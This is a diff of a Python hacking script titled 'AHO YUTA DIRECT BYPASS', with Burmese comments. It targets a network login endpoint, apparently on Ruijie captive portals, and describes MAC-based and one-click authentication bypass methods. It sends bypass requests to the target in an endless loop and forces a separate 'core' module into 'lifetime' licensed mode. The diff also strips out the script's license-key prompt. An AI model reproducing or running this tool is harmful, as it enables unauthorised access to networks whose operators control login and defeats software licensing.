@@ -22,8 +22,6 @@ def get_hwid():
 def check_access():
     uid = get_hwid()
     now = get_net_time()
-    
-    # ၁။ သိမ်းထားတဲ့ Key ရှိမရှိ အရင်စစ်မယ်
     if os.path.exists(KEY_FILE):
         with open(KEY_FILE, "r") as f:
             saved_key = f.read().strip()
@@ -31,25 +29,14 @@ def check_access():
                 check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                 if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                     return True
-
-    # ၂။ သိမ်းထားတဲ့ Key မရှိရင် (သို့) သက်တမ်းကုန်ရင် အသစ်တောင်းမယ်
-    os.system('clear')
-    print(f"{Fore.CYAN}--- AHO YUTA DIRECT BYPASS ---")
-    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
-    
-    user_key = input(f"\n{Fore.WHITE}ENTER YOUR LICENSE KEY: ").strip()
-
-    for i in range(0, 366):
-        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
-        if user_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
-            with open(KEY_FILE, "w") as f: f.write(user_key)
-            print(f"{Fore.GREEN}[✔] KEY ACTIVATED!")
-            return True
-            
     return False
 
 # --- DIRECT BYPASS MODES ---
 def send_bypass_requests(host):
+    # Method 1: Standard Direct Auth
+    # Method 2: Mac-based Bypass (Ruijie အသစ်တွေမှာ သုံးတာ)
+    # Method 3: One-click Auth Bypass
+    
     url = f"http://{host}/login/auth"
     headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
@@ -81,13 +68,16 @@ def start_yuta_hack():
     print(f"{Fore.YELLOW}[*] Targeting: {target}")
 
     try:
+        # ၁။ core.so ကို ချိတ်မယ်
         sys.path.append(os.getcwd())
         import core
         core.IS_LIFETIME = True
         
+        # ၂။ အစ်ကို့ရဲ့ core engine ကို နှိုးမယ်
         print(f"{Fore.BLUE}[*] Launching Core Engine...")
         threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True).start()
         
+        # ၃။ နောက်ထပ် Bypass လမ်းကြောင်းသစ်တွေကို တောက်လျှောက်ပို့မယ်
         print(f"{Fore.YELLOW}[*] Injecting Direct Bypass Payloads...")
         while True:
             send_bypass_requests(target)
@@ -102,5 +92,4 @@ if __name__ == "__main__":
     if check_access():
         start_yuta_hack()
     else:
-        print(f"{Fore.RED}[✘] INVALID KEY OR EXPIRED!")
-        sys.exit()
+        print(f"{Fore.RED}[✘] KEY ERROR")
